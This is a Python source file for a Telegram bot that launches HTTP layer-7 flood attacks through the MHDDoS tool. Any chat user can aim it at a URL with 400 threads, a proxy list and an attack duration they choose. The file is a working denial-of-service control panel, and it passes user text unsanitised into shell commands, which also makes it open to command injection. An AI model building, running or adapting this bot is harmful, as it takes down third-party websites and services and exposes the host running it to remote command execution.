import requests
import telegram
from telegram.ext import Updater, CallbackContext, CommandHandler, MessageHandler, Filters
from telegram.update import Update
import re 
import os
import subprocess
import concurrent.futures

token = os.getenv('TOKEN')
bot_number = os.getenv('NUM')
updater = Updater(token,use_context=True)
s = 400000000

def start(update: Update, context: CallbackContext):
  update.message.reply_text(f"/http (url) {bot_number}")
  
  
def tmps(update: Update, context: CallbackContext):
  global s
  s = update.message.text.replace('/t', '')
  update.message.reply_text(f"Attaking Time {s} s")
  
  
def speed_start(url):
  subprocess.call(f'python3 ~/MHDDoS/start.py GET {url} 1 400 p/list 10000 {s}', stdout=subprocess.PIPE, shell=True)

      
def STRESS(update: Update, context: CallbackContext):
  url = update.message.text.replace('/http', '')
  update.message.reply_text(f"METHOD: HTTP L7 THREADS : 400\n\nSTRESS: Send HTTP Packet With High Byte Time: {s} s")
  url_str = str(url)
  print(url_str)
  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py STRESS {url_str} 1 400 p/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
  output, error = p.communicate()
  if error:
    update.message.reply_text(f'Erreur : {error.decode()}')
  else:
     
    parts = output.decode().split('\n')
    
    
    for part in parts:
      chat_id = str(update.effective_user.id)
      update.message.bot.send_message(
        chat_id = chat_id,
        text=part,
        disable_web_page_preview=True,
        parse_mode='HTML'
      )
            
updater.dispatcher.add_handler(CommandHandler('t', tmps))


updater.dispatcher.add_handler(CommandHandler('start', start))
updater.dispatcher.add_handler(CommandHandler('http', STRESS))

updater.start_polling()
